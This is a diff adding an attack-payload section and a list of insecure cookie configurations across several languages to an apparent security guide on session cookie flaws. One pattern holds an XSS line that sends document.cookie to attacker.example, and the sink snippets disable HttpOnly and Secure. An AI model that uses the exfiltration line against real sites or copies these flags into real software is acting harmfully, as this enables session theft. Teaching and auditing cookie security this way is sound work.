@@ -32,6 +32,121 @@ The unsafe assumption is that HTTPS alone protects sessions, or that framework d
 | **Overlong lifetime** | Far-future `Expires` or `Max-Age` bypassing idle timeout policy |
 | **Logout gaps** | Client cookie cleared but server-side session record still valid |
 
+## Attack Payloads
+
+Use these in authorized tests on login and session endpoints. Abuse scenarios include XSS cookie theft, network capture, and CSRF with permissive SameSite.
+
+### Pattern 1: Missing HttpOnly (XSS theft abuse scenario)
+
+```javascript
+// After any XSS on the origin
+document.cookie  // returns "session=abc123" when HttpOnly absent
+fetch('https://attacker.example/?c='+document.cookie)
+```
+
+### Pattern 2: Missing Secure over HTTP
+
+```http
+GET http://app.example/ HTTP/1.1
+Cookie: session=abc123
+```
+
+Cleartext transport exposes the session on untrusted networks.
+
+### Pattern 3: SameSite absent or None without Secure
+
+```http
+# Cross-site POST from attacker.example with victim browser
+POST https://app.example/transfer HTTP/1.1
+Cookie: session=victim_session
+Origin: https://attacker.example
+```
+
+### Pattern 4: Overly long session lifetime
+
+```http
+Set-Cookie: session=abc; Max-Age=31536000; Path=/
+```
+
+Stolen cookies remain valid for a year.
+
+### Pattern 5: Session fixation via attacker-set cookie
+
+```http
+Set-Cookie: session=attacker_chosen_id; Path=/
+# Victim logs in while browser already holds attacker-known id
+```
+
+### Pattern 6: Logout without server invalidation
+
+```javascript
+document.cookie = "session=; Max-Age=0";  // client cleared
+// Server-side session store still accepts session=abc123
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search every `Set-Cookie` path and framework session configuration.
+
+### Python
+
+```python
+resp.set_cookie("session", sid, httponly=False, secure=False)
+app.config["SESSION_COOKIE_SECURE"] = False
+app.config["SESSION_COOKIE_SAMESITE"] = None
+```
+
+Flask `session` defaults; Django `SESSION_COOKIE_HTTPONLY = False`; Starlette `set_cookie` without flags.
+
+### Java
+
+```java
+Cookie c = new Cookie("JSESSIONID", id);
+c.setHttpOnly(false);
+c.setSecure(false);
+response.addCookie(c);
+```
+
+`server.servlet.session.cookie.http-only=false` in `application.properties`; Spring `CookieSerializer` customizations.
+
+### C#
+
+```csharp
+Response.Cookies.Append("session", id);  // default flags may omit HttpOnly/Secure
+options.Cookie.HttpOnly = false;
+options.Cookie.SecurePolicy = CookieSecurePolicy.None;
+```
+
+ASP.NET Core `CookieAuthenticationOptions`; legacy `FormsAuthentication` cookie settings.
+
+### JavaScript (Node.js)
+
+```javascript
+res.cookie("session", sid, { httpOnly: false, secure: false, sameSite: false });
+cookieSession({ name: "session", secure: false });
+```
+
+`express-session` defaults without `cookie.secure` behind TLS terminators.
+
+### Go
+
+```go
+http.SetCookie(w, &http.Cookie{Name: "session", Value: sid})  // no HttpOnly/Secure
+```
+
+Gorilla sessions, `echo` cookie middleware without explicit flags.
+
+### Servlet deployment descriptors
+
+```xml
+<session-config>
+  <cookie-config>
+    <http-only>false</http-only>
+    <secure>false</secure>
+  </cookie-config>
+</session-config>
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
